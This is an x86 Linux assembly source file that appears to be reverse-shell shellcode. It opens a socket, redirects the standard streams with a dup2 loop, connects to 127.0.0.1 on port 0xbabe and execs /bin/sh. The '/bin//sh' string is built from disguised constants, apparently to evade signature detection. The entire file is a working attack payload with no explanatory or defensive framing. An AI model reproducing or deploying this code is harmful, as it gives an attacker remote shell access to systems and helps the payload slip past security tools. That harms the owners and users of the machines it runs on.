global _start
section .text
_start:
 
xor ebx,ebx		;clear registers
xor eax,eax
 
mov byte al,0x66 	;syscall for socket()
push ebx 		;push 0 as first arg
inc ebx 		;ebx to 1
push ebx		;push 1 as second arg
push byte 0x2 		;push 0x2 as third arg
mov ecx, esp 		;save argument list to ecx
int 0x80 		;socket syscall
 
xchg ebx,eax		;swap ebx eax
 
push byte 0x2
pop ecx			;pop 0x2 into ecx, counter
 
my_loop:
  mov BYTE al, 0x3F 	
  int 0x80         	;syscall 
  dec ecx           	;decrease counter
  jns my_loop      
 
push 0x0100007f  	;push first argument = IP
push word 0xbabe	;push TCP port
push word 2 		;2 for AF_INET
mov ecx,esp 		;save argument list on stack
 
 
push byte 0x10  	;sockaddr_len
push ecx  		;(struct sockaddr *)&server           
push ebx   		;socket descriptor              
mov ecx,esp 		;save argument list to ecx
mov al,102 		;socket call               
int 0x80 		;syscall
 
 
xor eax,eax		;clear
push eax
 
mov esi, 0x46510d0d
add esi, 0x22222222     ;push 0x68732f2f ;"sh//"
mov dword [esp-4], esi

mov esi, 0x4c47411d
add esi, 0x22222112     ;push 0x6e69622f ;"nib/"
mov dword [esp-8], esi
sub esp, 8              ;align esp 
 
mov ebx,esp		;filename
 
push eax
mov ecx,esp		;envp[]
 
push ebx
mov edx,esp		;filename string terminator, edx is 00
 
mov al,11
int 0x80
